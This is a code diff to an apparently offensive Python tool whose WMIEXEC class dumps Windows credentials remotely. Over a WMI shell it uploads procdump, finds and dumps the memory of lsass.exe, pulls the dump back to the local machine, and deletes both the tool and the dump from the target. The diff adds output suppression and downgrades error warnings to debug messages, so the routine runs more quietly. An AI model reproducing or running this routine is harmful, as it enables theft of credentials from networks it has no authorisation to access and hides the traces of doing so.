@@ -104,24 +104,26 @@ class WMIEXEC:
 
             procpath = os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'procdump', 'procdump%s.exe' % (osArch))
             logging.debug("%sUploading procdump to %s..." % (debugBlue, addr))
-            self.shell.do_put(procpath)
+            with suppress_std():
+                self.shell.do_put(procpath)
 
-            cmd = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do procdump64.exe -accepteula -ma ^%B C:\\{}.dmp""".format(addr)
+            cmd = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do procdump{}.exe -accepteula -ma ^%B C:\\{}.dmp""".format(osArch, addr)
             logging.debug("%sExecuting procdump on %s..." % (debugBlue, addr))
-            with suppress_stdout():
+            with suppress_std():
                 self.shell.onecmd(cmd)
-            time.sleep(4)
+            time.sleep(5)
 
             logging.debug("%sRetrieving %s's dump locally..." % (debugBlue, addr))
-            self.shell.do_get("%s.dmp" % (addr))
-            shutil.move(addr + '.dmp', os.path.join(dumpDir, addr + '.dmp'))
+            with suppress_std():
+                self.shell.do_get("%s.dmp" % (addr))
+                shutil.move(addr + '.dmp', os.path.join(dumpDir, addr + '.dmp'))
 
             logging.debug("%sDeleting procdump on %s..." % (debugBlue, addr))
-            with suppress_stdout():
+            with suppress_std():
                 self.shell.onecmd("del procdump%s.exe" % (osArch))
 
             logging.debug("%sDeleting dump on %s..." % (debugBlue, addr))
-            with suppress_stdout():
+            with suppress_std():
                 self.shell.onecmd("del %s.dmp" % (addr))
 
             if True:
@@ -134,7 +136,7 @@ class WMIEXEC:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
-            logging.warning("%sErr: %s..." % (warningRed, e))
+            logging.debug("%sErr: %s..." % (warningRed, e))
             if smbConnection is not None:
                 smbConnection.logoff()
             dcom.disconnect()
